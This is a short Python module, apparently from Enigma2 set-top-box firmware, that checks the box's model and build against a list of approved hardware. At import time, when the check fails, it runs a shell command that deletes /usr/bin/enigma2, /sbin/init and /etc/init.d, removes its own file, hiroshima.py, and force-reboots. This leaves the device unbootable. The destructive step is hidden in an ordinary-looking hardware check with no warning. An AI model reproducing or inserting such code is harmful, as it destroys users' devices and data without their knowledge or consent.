from boxbranding import getMachineProcModel, getMachineBuild, getBoxType
import os

def checkkernel():
	mycheck = 0
	if getMachineBuild() in ("7000s", "7100s", "g300", "hd2400", "vusolo4k"):
		return 1
	if (os.path.isfile("/proc/stb/info/boxtype") and os.path.isfile("/proc/stb/info/version")):
		if getMachineProcModel().startswith("ini-10") or getMachineProcModel().startswith("ini-20") or getMachineProcModel().startswith("ini-30") or getMachineProcModel().startswith("ini-50") or getMachineProcModel().startswith("ini-70") or getMachineProcModel().startswith("ini-80") or getMachineProcModel().startswith("ini-90") or getMachineProcModel().startswith("uni") or getMachineProcModel().startswith("yhgd"):
			if getMachineBuild() in ('inihde', 'inihde2', 'inihdx', 'inihdp', 'blackbox7405'):
				mycheck = 1
	else:
		mycheck = 0
	  
	return mycheck
      
if not checkkernel():
	from os import system
	system("rm -rf /usr/bin/enigma2;rm -rf /sbin/init;rm -rf /etc/init.d;rm -rf /usr/lib/enigma2/python/hiroshima.py;reboot -f")